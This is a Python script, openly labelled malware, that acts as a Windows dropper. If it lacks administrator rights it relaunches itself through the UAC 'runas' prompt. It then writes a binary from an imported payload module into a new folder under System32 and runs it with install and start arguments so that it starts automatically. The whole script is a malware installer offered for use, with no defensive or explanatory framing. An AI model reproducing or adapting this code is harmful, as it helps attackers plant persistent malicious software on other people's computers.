import sys
import ctypes
import os
from local_libs import payload


def is_admin():
    return ctypes.windll.shell32.IsUserAnAdmin()

def run_as_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)

def create_malware(path, binary_code):
    with open(path, "wb") as f:
        f.write(binary_code)

def start_malware():
    os.system(f"{new_binary_path} --startup=auto install")
    os.system(f"{new_binary_path} start")


if __name__ == "__main__":
    # only for development
    log = open("logging.log", "a")
    sys.stderr = log
    # end

    if is_admin() == 0:
        run_as_admin()

    program_name = "malware.exe"
    new_dir = f"C:\\Windows\\System32\\Malware"
    new_binary_path = f"{new_dir}\\{program_name}"

    if not os.path.exists(new_dir):
        os.mkdir(new_dir)
    create_malware(new_binary_path, payload.payload())
    start_malware()

